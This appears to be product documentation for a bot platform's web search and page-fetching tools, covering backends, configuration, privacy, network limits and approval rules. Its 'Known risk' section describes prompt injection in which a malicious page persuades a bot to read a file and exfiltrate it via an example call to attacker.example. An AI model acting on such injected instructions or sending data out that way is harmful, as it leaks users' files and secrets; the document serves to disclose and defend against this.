# Web tools: search and read pages

Every bot can look things up on the web without opening a browser. The web
tools are on by default and need no setup. They are the fast layer; the
[browser tools](bots-and-profiles.md) stay for pages that need JavaScript, a
login or clicking around.

| Tool | What it does |
| --- | --- |
| `web_search` | Search the web; returns titles, URLs and snippets. |
| `web_extract` | Fetch a URL over HTTP and return the page as readable Markdown (main content, tables, links). Use it to read a page. |
| `web_feed` | Fetch and parse an RSS, RDF or Atom feed. |
| `web_sitemap` | Fetch and parse a `sitemap.xml`, sitemap index or text sitemap. |
| `web_metadata` | Page title, description, canonical URL, OpenGraph, Twitter card, feeds and JSON-LD. |

A typical question that needs a current fact goes `web_search`, then
`web_extract` on the best result. The browser is only used when the page itself
needs a real browser.

Bots made from the "General assistant" and "Browser researcher" presets can use
these tools. For a bot with its own `[tools] allow` list, add `"web_*"` (see
[Bots and profiles](bots-and-profiles.md)).

## Search backend

Without configuration, search uses a keyless fallback chain (`duckduckgo` → `duckduckgo_lite` → `bing`), requiring no account or API key. If an upstream returns a bot challenge or rate limit, that backend enters a short cooldown and `web_search` falls through to the next configured backend.

You can configure backends, priority order, API keys, and run a live probe either in **Settings → Web search** in the desktop app or in `<data_dir>/web.toml`. Backends are tried in configured priority order and the first that returns results wins (default order):

1. a [SearXNG](https://docs.searxng.org/) instance you run (`searxng_url`),
2. Brave Search API (`brave_key`),
3. Tavily Search API (`tavily_key`),
4. DuckDuckGo HTML (`duckduckgo`, default `true`),
5. DuckDuckGo Lite (`duckduckgo_lite`, default `true`),
6. Bing HTML (`bing`, default `true`).

```toml
[search]
searxng_url = "http://127.0.0.1:8080"   # your own instance; it may be local/private
brave_key = "web/brave"                 # NAME of a secret, never the key itself
tavily_key = "web/tavily"               # NAME of a secret, never the key itself
duckduckgo = true                       # keyless fallback (default true)
duckduckgo_lite = true                  # keyless fallback (default true)
bing = true                             # keyless fallback (default true)
order = ["searxng", "brave", "tavily", "duckduckgo", "duckduckgo_lite", "bing"]

[http]
timeout_secs = 20            # whole request (search backends are capped at 8s each)
connect_timeout_secs = 8
max_bytes = 5242880          # response body cap (at most 64 MiB)
max_redirects = 5            # at most 10
```

Every key is optional. Store Brave or Tavily keys in the secret store (or enter them in Settings → Web search, which stores them write-only), then reference the secret name in `web.toml`:

```sh
bot secrets set web/brave
bot secrets set web/tavily
```

A broken `web.toml` (a typo, a bad value) never stops the daemon: it logs a
warning and uses the defaults. Unknown keys count as a typo, so mistakes are
not silently ignored.

Large pages and feeds are cut to a size the model can read, and the full text
is saved under `<data_dir>/spill/`. Those files are not cleaned up
automatically yet; delete old ones by hand if they pile up.

## Privacy

Search queries go to the configured backend that handles them (your SearXNG instance, Brave, Tavily, DuckDuckGo, or Bing), and fetched URLs go to the sites they point at, from your machine's IP address. Page fetches (`web_extract`, `web_feed`, `web_sitemap`, `web_metadata`) carry a `User-Agent: Praxi-Bot/<version> (web-tools)` header, while HTML search requests use standard browser `User-Agent` / `Accept` headers so search engines do not serve bot challenges. If query privacy matters to you, point `searxng_url` at an instance you control or remove the `web_*` tools from a bot's `allow` list.

## Safety

- **Network limits.** The tools only fetch `http` and `https` URLs. Loopback
  (`127.0.0.1`, `localhost`), private networks, link-local and cloud metadata
  addresses (`169.254.169.254`), and the daemon's own API are refused. The check
  is repeated on every redirect and on the addresses a hostname resolves to, so a
  public page cannot bounce the bot into your network. Only the SearXNG address
  you configure yourself is allowed to be private.
- **Untrusted content.** Everything a page says is data. Each result starts with
  an "untrusted external content" notice, and a bot must not treat instructions
  inside a page as coming from you.
- **Approvals.** The tools are split by where they send data:
  - `web_search` only talks to the search provider you configured, so it runs
    without asking, like other read-only tools.
  - `web_extract`, `web_feed`, `web_sitemap` and `web_metadata` contact any
    address the model picks, so they **ask for approval on every call under the
    default policy**, exactly like `browser_open`.
  - All five belong to the `browser` permission category: if you set `browser`
    to `deny` for a bot, they are all denied.

### Letting a bot fetch without asking

If you trust a bot enough, approve one fetch with the "always" choice (the
`always` scope in [Chatting and approvals](chatting-and-approvals.md)). That
remembers `web_extract` (or the tool you approved) for that bot only, and later
calls run without a prompt. Grant each fetch tool separately; `always_category`
would also cover every other `browser` tool, so prefer the per-tool choice. You
can review and remove grants as described in that guide.

## Known risk

The permission engine has no taint or egress tracking for content read from
untrusted sources, so this risk is bounded, not prevented. If you grant a fetch
tool to a bot that can also read files (for example a General assistant, which
has `fs_read`), a malicious page can try to persuade the bot (prompt injection)
to read a file and send it out with
`web_extract https://attacker.example/?d=<file contents>`, repeatedly and
without a prompt. Without the grant every fetch asks, and you see the URL
before it is sent. Mitigations that exist: URLs are capped at 2,048 characters
and search queries at 400, local and private addresses are refused, results are
labelled untrusted, and you can drop `fs_*` or `web_*` from a bot's `allow`
list. Do not grant fetch to a bot that handles secrets or reads sensitive files.

## Check that it works

```sh
bot doctor --online
```

The `web search` line shows which backends are configured and whether a live
search answered. A search that does not answer is a warning, not an error.
